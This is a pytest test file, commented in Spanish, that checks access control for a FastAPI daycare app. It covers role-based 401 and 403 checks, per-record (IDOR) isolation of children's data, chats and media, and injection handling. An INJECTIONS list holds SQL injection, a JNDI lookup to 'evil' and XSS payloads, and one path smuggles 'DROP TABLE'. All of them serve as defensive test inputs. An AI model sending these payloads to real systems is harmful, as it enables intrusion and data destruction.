"""Control de acceso de punta a punta (rúbrica, partes 2 y 3).

Los permisos por rol se leen de las dependencias reales de cada ruta (`require_role`), así que si alguien agrega un
endpoint y se le olvida protegerlo, estas pruebas lo cachan sin tener que actualizar ninguna lista.
Los permisos por registro (IDOR) se prueban a mano, con personas y niños de `world`.
"""

import inspect
import uuid

import pytest
from fastapi.routing import APIRoute

from app.main import app
from app.modules.auth.models import Role

# lo único que se puede llamar sin sesión.
PUBLIC = {
    ("GET", "/api/v1/health/live"),
    ("GET", "/api/v1/health/ready"),
    ("POST", "/api/v1/auth/login"),
    ("POST", "/api/v1/auth/activate"),
    ("POST", "/api/v1/auth/refresh"),
    ("POST", "/api/v1/auth/logout"),
    # la página del enlace de invitación y la verificación de la app: las abre una persona o Android, sin token.
    ("GET", "/invitar"),
    ("GET", "/.well-known/assetlinks.json"),
}


def _roles_required(route: APIRoute) -> set[str]:
    """Los roles que la ruta exige con require_role; vacío si basta con tener sesión."""
    roles: set[str] = set()
    stack = list(route.dependant.dependencies)
    while stack:
        dependency = stack.pop()
        stack.extend(dependency.dependencies)
        call = dependency.call
        if getattr(call, "__name__", None) == "dependency" and getattr(call, "__closure__", None):
            found = inspect.getclosurevars(call).nonlocals.get("roles")
            if found:
                roles |= {str(role.value) for role in found}
    return roles


def _routes() -> list[tuple[str, str, APIRoute]]:
    return [
        (method, route.path, route)
        for route in app.routes
        if isinstance(route, APIRoute)
        for method in sorted(route.methods - {"HEAD", "OPTIONS"})
    ]


def _fill(path: str) -> str:
    """Rellena los parámetros de la ruta con valores que no existen: da igual, el permiso va primero."""
    return (
        path.replace("/api/v1", "")
        .replace("{user_id}", str(uuid.uuid4()))
        .replace("{teacher_id}", str(uuid.uuid4()))
        .replace("{parent_id}", str(uuid.uuid4()))
        .replace("{", "")
        .replace("}", "")
        .replace("child_id", "999")
        .replace("classroom_id", "999")
        .replace("conversation_id", "999")
        .replace("media_id", "999")
        .replace("document_id", "999")
        .replace("person_id", "999")
        .replace("moment_id", "999")
        .replace("template_id", "999")
    )


ROUTES = _routes()


def test_the_route_list_is_not_empty():
    # si cambia la estructura de la app y esto queda vacío, las pruebas de abajo no probarían nada.
    assert len(ROUTES) > 60


@pytest.mark.parametrize("method,path", [(m, p) for m, p, _ in ROUTES if (m, p) not in PUBLIC])
async def test_every_private_endpoint_needs_a_token(client, method, path):
    response = await client.request(method, _fill(path))
    assert response.status_code == 401, f"{method} {path} respondió {response.status_code} sin token"
    assert response.json()["code"] == "UNAUTHENTICATED"


@pytest.mark.parametrize(
    "method,path,required",
    [(m, p, sorted(_roles_required(r))) for m, p, r in ROUTES if _roles_required(r)],
)
async def test_roles_that_are_not_allowed_get_403(client, world, method, path, required):
    tokens = {"ADMIN": world.admin, "TEACHER": world.teacher_a, "PARENT": world.mom}
    for role, headers in tokens.items():
        if role in required:
            continue
        response = await client.request(method, _fill(path), headers=headers)
        assert response.status_code == 403, f"{method} {path} con rol {role} respondió {response.status_code}"
        assert response.json()["code"] == "FORBIDDEN"


def test_every_role_is_covered_by_the_matrix():
    seen = set().union(*(_roles_required(route) for _, _, route in ROUTES))
    assert seen == {role.value for role in Role}


# ---------------------------------------------------------------- permiso por registro (IDOR)

# lo que lee un niño. Cada una de estas rutas debe responder 404 (no 403) a quien no lo ve,
# para no revelar que ese niño existe.
def _child_reads(child_id: int) -> list[str]:
    return [
        f"/children/{child_id}",
        f"/children/{child_id}/day",
        f"/children/{child_id}/weekly-summary",
        f"/children/{child_id}/attendance?month=2026-10",
        f"/children/{child_id}/authorized-pickups",
        f"/children/{child_id}/documents",
        f"/media?child_id={child_id}",
    ]


async def test_a_parent_cannot_read_another_childs_data(client, world):
    # mom ve a Sofía; Renata es hija de dad.
    for path in _child_reads(world.renata.id):
        response = await client.get(path, headers=world.mom)
        assert response.status_code in (403, 404), f"mamá leyó {path}: {response.status_code}"
        assert response.status_code != 200


async def test_not_even_the_existence_of_other_children_leaks(client, world):
    """Un niño ajeno y un niño que no existe deben responder exactamente igual."""
    for template in ("/children/{}", "/children/{}/day", "/children/{}/authorized-pickups"):
        other = await client.get(template.format(world.renata.id), headers=world.mom)
        missing = await client.get(template.format(99999), headers=world.mom)
        assert other.status_code == missing.status_code
        assert other.json()["code"] == missing.json()["code"]


async def test_a_teacher_only_reads_children_of_her_room(client, world):
    # karla (Preescolar 2) no ve a Renata (Maternal); fernando (Maternal) no ve a Sofía.
    for path in (f"/children/{world.renata.id}", f"/children/{world.renata.id}/day"):
        assert (await client.get(path, headers=world.teacher_a)).status_code == 404
    for path in (f"/children/{world.sofia.id}", f"/children/{world.sofia.id}/day"):
        assert (await client.get(path, headers=world.teacher_b)).status_code == 404
    # y a los de su sala sí.
    assert (await client.get(f"/children/{world.sofia.id}", headers=world.teacher_a)).status_code == 200
    assert (await client.get(f"/children/{world.renata.id}", headers=world.teacher_b)).status_code == 200


async def test_the_admin_reads_everything(client, world):
    for child in (world.sofia, world.diego, world.renata):
        for path in (f"/children/{child.id}", f"/children/{child.id}/day"):
            assert (await client.get(path, headers=world.admin)).status_code == 200


async def test_a_teacher_cannot_mark_attendance_or_write_for_other_rooms(client, world):
    changed = await client.put(f"/attendance/{world.renata.id}", headers=world.teacher_a, json={"status": "PRESENT"})
    assert changed.status_code == 404
    entry = await client.post(
        f"/children/{world.renata.id}/daily-entries",
        headers=world.teacher_a,
        json={"mood": "HAPPY"},
    )
    assert entry.status_code in (404, 422)  # 422 si el cuerpo no encaja; nunca 200/201
    assert entry.status_code != 200


async def test_a_teacher_cannot_list_another_rooms_children_or_routine(client, world):
    for path in (f"/classrooms/{world.room_b.id}/children", f"/classrooms/{world.room_b.id}/routine"):
        response = await client.get(path, headers=world.teacher_a)
        assert response.status_code in (403, 404), f"{path}: {response.status_code}"
    assert (await client.get(f"/classrooms/{world.room_a.id}/children", headers=world.teacher_a)).status_code == 200


async def test_a_parent_cannot_write_for_a_child_that_is_not_theirs(client, world):
    note = await client.post(f"/children/{world.renata.id}/notes", headers=world.mom, json={"text": "Hola"})
    assert note.status_code == 404
    pickup = await client.post(
        f"/children/{world.renata.id}/authorized-pickups", headers=world.mom, json={"full_name": "Intruso"}
    )
    assert pickup.status_code == 404


async def test_conversations_are_private_to_the_family_and_the_room(client, world):
    mine = (await client.get("/conversations", headers=world.mom)).json()
    chat = mine[0]["id"]
    assert {c["child"]["id"] for c in mine} == {world.sofia.id}
    # los demás ni la leen, ni escriben, ni la marcan como leída.
    for headers in (world.dad, world.teacher_b):
        assert (await client.get(f"/conversations/{chat}/messages", headers=headers)).status_code == 404
        sent = await client.post(f"/conversations/{chat}/messages", headers=headers, json={"text": "intruso"})
        assert sent.status_code == 404
        assert (await client.post(f"/conversations/{chat}/read", headers=headers)).status_code == 404
    # y la lista de cada quien solo trae lo suyo.
    assert {c["id"] for c in (await client.get("/conversations", headers=world.dad)).json()}.isdisjoint({chat})


async def test_media_cannot_be_completed_or_requested_for_deletion_by_others(client, world, storage):
    permit = await client.post(
        "/media/uploads", headers=world.teacher_a, json={"content_type": "image/jpeg", "size_bytes": 10}
    )
    media_id = permit.json()["media_id"]
    storage.put(permit.json()["fields"]["key"])
    # solo quien la pidió puede completarla.
    assert (await client.post(f"/media/{media_id}/complete", headers=world.teacher_b)).status_code == 404
    assert (await client.post(f"/media/{media_id}/complete", headers=world.mom)).status_code in (403, 404)
    # un padre ajeno no pide borrar fotos que no son de su hijo.
    deletion = await client.post(f"/media/{media_id}/deletion-request", headers=world.dad, json={})
    assert deletion.status_code == 404


async def test_ids_in_the_path_must_be_numbers_or_uuids(client, world):
    for path in ("/children/uno", "/children/1;DROP TABLE child", "/teachers/no-es-uuid", "/classrooms/--"):
        response = await client.get(path, headers=world.admin)
        assert response.status_code == 422, f"{path}: {response.status_code}"


# ---------------------------------------------------------------- inyección

INJECTIONS = [
    "' OR '1'='1",
    "'; DROP TABLE app_user; --",
    "admin@test.dev' --",
    '" OR ""="',
    "1; SELECT pg_sleep(5)",
    "${jndi:ldap://evil/x}",
    "<script>alert(1)</script>",
]


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_injection_in_login_never_gets_in(client, world, payload):
    response = await client.post("/auth/login", json={"email": payload, "password": payload})
    assert response.status_code in (401, 422)
    assert "access_token" not in response.text


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_injection_in_query_parameters_is_not_a_500(client, world, payload):
    for path in (
        f"/invitations?status={payload}",
        f"/audit-log?action={payload}",
        f"/media?child_id={world.sofia.id}&category={payload}",
        f"/announcements?limit={payload}",
    ):
        response = await client.get(path, headers=world.admin)
        assert response.status_code < 500, f"{path}: {response.status_code}"
    # una acción inventada es solo un filtro que no encuentra nada
    found = await client.get("/audit-log", headers=world.admin, params={"action": payload})
    assert found.status_code == 200 and found.json()["items"] == []


@pytest.mark.parametrize("payload", INJECTIONS)
async def test_injection_text_is_stored_as_plain_text(client, world, db, payload):
    created = await client.post(
        "/children",
        headers=world.admin,
        json={"name": payload[:90], "surname": "Prueba", "birth_date": "2022-05-01", "classroom_id": world.room_a.id},
    )
    assert created.status_code == 201
    assert created.json()["name"] == payload[:90]  # tal cual, sin ejecutarse
    # y las tablas siguen ahí
    assert (await client.get("/children", headers=world.admin)).status_code == 200
    assert (await client.post("/auth/login", json={"email": "karla@test.dev", "password": "x"})).status_code == 401


async def test_unknown_fields_and_wrong_types_are_rejected_not_executed(client, world):
    response = await client.post(
        "/children", headers=world.admin, json={"name": {"$ne": None}, "birth_date": "no-es-fecha"}
    )
    assert response.status_code == 422
    assert response.json()["code"] == "VALIDATION_ERROR"
